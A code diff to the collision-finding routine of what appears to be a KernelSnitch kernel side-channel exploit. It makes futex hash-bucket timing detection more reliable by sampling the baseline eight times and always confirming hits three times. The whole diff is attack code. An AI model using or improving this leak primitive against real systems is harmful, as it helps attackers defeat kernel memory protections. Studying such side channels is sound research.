@@ -391,10 +391,8 @@ static inline void kernelsnitch_find_collisions(struct kernelsnitch_shared_state
 #ifndef KERNELSNITCH_THRESHOLD_MULT
 #define KERNELSNITCH_THRESHOLD_MULT 10
 #endif
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
 #ifndef KERNELSNITCH_COLLISION_CONFIRMATIONS
-#define KERNELSNITCH_COLLISION_CONFIRMATIONS 1
-#endif
+#define KERNELSNITCH_COLLISION_CONFIRMATIONS 3
 #endif
     size_t count = 0;
     size_t wanted;
@@ -404,9 +402,16 @@ static inline void kernelsnitch_find_collisions(struct kernelsnitch_shared_state
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
-    size_t approx_time = MIN(
-        __measure(ks, (size_t)&ks->futexes[0]),
-        __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+#ifndef KERNELSNITCH_BASELINE_SAMPLES
+#define KERNELSNITCH_BASELINE_SAMPLES 8
+#endif
+    size_t approx_time = (size_t)-1;
+    for (int __b = 0; __b < KERNELSNITCH_BASELINE_SAMPLES; ++__b) {
+        size_t __s = MIN(
+            __measure(ks, (size_t)&ks->futexes[0]),
+            __measure(ks, (size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+        if (__s < approx_time) approx_time = __s;
+    }
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
@@ -423,7 +428,6 @@ static inline void kernelsnitch_find_collisions(struct kernelsnitch_shared_state
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(ks, futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
-#if defined(REQUIRE_FRESH_P0_SESSION) && REQUIRE_FRESH_P0_SESSION
             int confirmed = 1;
             for (size_t confirmation = 1;
                  confirmation < KERNELSNITCH_COLLISION_CONFIRMATIONS;
@@ -436,7 +440,6 @@ static inline void kernelsnitch_find_collisions(struct kernelsnitch_shared_state
             }
             if (!confirmed)
                 continue;
-#endif
             count++;
             ks->futex_addrs[count] = futex_addr;
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
